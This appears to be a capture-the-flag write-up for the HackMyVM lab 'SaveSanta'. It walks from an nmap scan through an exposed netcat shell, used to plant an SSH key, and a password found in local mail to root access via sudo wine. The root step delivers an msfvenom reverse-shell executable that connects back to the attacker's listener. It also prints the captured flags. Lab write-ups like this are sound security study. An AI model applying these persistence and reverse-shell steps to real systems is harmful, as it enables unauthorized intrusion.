# SaveSanta

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.118:22
Open 10.0.2.118:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.118
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH7MzSovnIRMiRExL2yRZPzvAjSotLWKXBTXeFdtc99kGXMWcL3tftNdU7jYIDh2k6rlka5SMzxeJlSXKnU2B0E=
|   256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGrfk2HBNp7CTNIjdbS02Vocw337nuKfhxpSIEEmsvRm
80/tcp open  http    syn-ack Apache httpd
| http-robots.txt: 3 disallowed entries 
|_/ /administration/ /santa
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: The Naughty Elves
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/savesanta/writeup.png)

`/santa/` is a valid path and has a Log In form, however when entering anything we are redirected to Not Found..

![writeup-1.png](/assets/pentest/hackmyvm/savesanta/writeup-1.png)

Errr... the main page changed?!

![writeup-2.png](/assets/pentest/hackmyvm/savesanta/writeup-2.png)

This behavior suggests the target may be using a **port-knocking–style mechanism** or some form of **state-driven access control**, where specific network activity triggers the daemon to expose additional ports. A rescan confirms that the new port is now reachable.
```
54800/tcp open  unknown syn-ack
```

### Hidden Service

```bash
└─$ nc 10.0.2.118 54800
EHLO
test
id
uid=1001(alabaster) gid=1001(alabaster) groups=1001(alabaster),100(users)
ls -alh
total 36K
drwxr-x---  4 alabaster alabaster 4.0K Jan  4  2024 .
drwxr-xr-x 10 root      root      4.0K Dec  1 14:06 ..
-rw-------  1 alabaster alabaster    0 Jan  4  2024 .bash_history
-rw-r--r--  1 alabaster alabaster  220 Dec 30  2023 .bash_logout
-rw-r--r--  1 alabaster alabaster 3.7K Dec 30  2023 .bashrc
drwx------  2 alabaster alabaster 4.0K Dec 30  2023 .cache
drwxrwxr-x  3 alabaster alabaster 4.0K Dec 30  2023 .local
-rw-r--r--  1 alabaster alabaster  807 Dec 30  2023 .profile
-rw-rw-r--  1 alabaster alabaster   66 Jan  4  2024 .selected_editor
-rw-rw-r--  1 alabaster alabaster 1.8K Dec 30  2023 user.txt
```

## SSH (alabaster)

```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpQG6KJJQNVcnvM060w90+z0GZQieHqR0eOG93HxYBL woyag@kraken' >> ~/.ssh/authorized_keys
---
PASTE IN netcat
---
└─$ ssh -i id_rsa alabaster@10.0.2.118
alabaster@santa:~$ id
uid=1001(alabaster) gid=1001(alabaster) groups=1001(alabaster),100(users)
```

### User.txt

```bash
alabaster@santa:~$ grep 'HMV{.*}' user.txt -o
HMV{f3fda86e428ccda3e33d207217665201}
```

## Privilege Escalation (Bill)

SMTP is active internally, port 25+587
```bash
alabaster@santa:~$ ss -tunlp
Netid  State   Recv-Q  Send-Q       Local Address:Port      Peer Address:Port  Process
udp    UNCONN  0       0               127.0.0.54:53             0.0.0.0:*
udp    UNCONN  0       0            127.0.0.53%lo:53             0.0.0.0:*
udp    UNCONN  0       0        10.0.2.118%enp0s3:68             0.0.0.0:*
tcp    LISTEN  0       1                  0.0.0.0:54800          0.0.0.0:*      users:(("nc",pid=3261,fd=3))
tcp    LISTEN  0       100              127.0.0.1:8461           0.0.0.0:*
tcp    LISTEN  0       4096         127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN  0       10               127.0.0.1:25             0.0.0.0:*
tcp    LISTEN  0       4096            127.0.0.54:53             0.0.0.0:*
tcp    LISTEN  0       10               127.0.0.1:587            0.0.0.0:*
tcp    LISTEN  0       4096                     *:22                   *:*
tcp    LISTEN  0       511                      *:80                   *:*
```

```bash
alabaster@santa:/var/mail$ cat alabaster
From santa@santa.hmv  Mon Dec  1 14:06:02 2025
Return-Path: <santa@santa.hmv>
Received: from santa.hmv (localhost [127.0.0.1])
        by santa.hmv (8.17.1.9/8.17.1.9/Debian-2) with ESMTP id 5B1E62BP001087
        for <alabaster@santa.hmv>; Mon, 1 Dec 2025 14:06:02 GMT
Received: (from santa@localhost)
        by santa.hmv (8.17.1.9/8.17.1.9/Submit) id 5B1E62g2001086;
        Mon, 1 Dec 2025 14:06:02 GMT
From: Santa Claus <santa@santa.hmv>
Message-Id: <202512011406.5B1E62g2001086@santa.hmv>
Subject: Important update about the hack
To: <alabaster@santa.hmv>
User-Agent: mail (GNU Mailutils 3.15)
Date: Mon,  1 Dec 2025 14:06:02 +0000

Dear Alabaster,

As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible.

I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates.

His account has been created and ready to logon. When Bill arrives, tell him his username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' He will know what to do next.

Please help Bill as much as possible so Christmas can go on!

- Santa
```

## Privilege Escalation (xxx)

::: info Creds
`bill:JingleBellsPhishingSmellsHackersGoAway`
:::

```bash
alabaster@santa:/var/mail$ su - bill
Password: JingleBellsPhishingSmellsHackersGoAway
$ id
uid=1007(bill) gid=1007(bill) groups=1007(bill)
```

```bash
bill@santa:~$ sudo -l
Matching Defaults entries for bill on santa:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bill may run the following commands on santa:
    (ALL) NOPASSWD: /usr/bin/wine
```

- [https://www.hacknos.com/wine-privilege-escalation/](https://www.hacknos.com/wine-privilege-escalation/)

```bash
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o shell.exe
└─$ sshpass -p 'JingleBellsPhishingSmellsHackersGoAway' scp shell.exe bill@10.0.2.118:.
└─$ penelope -p 4444
---
bill@santa:~$ sudo wine shell.exe
---
Z:\home\bill>whoami
SANTA\root
```

### Root.txt

```bash
Z:\root>type \root\root.txt
HMV{67df9276f8aaa3f9f50b3e41fe5cbc53}
```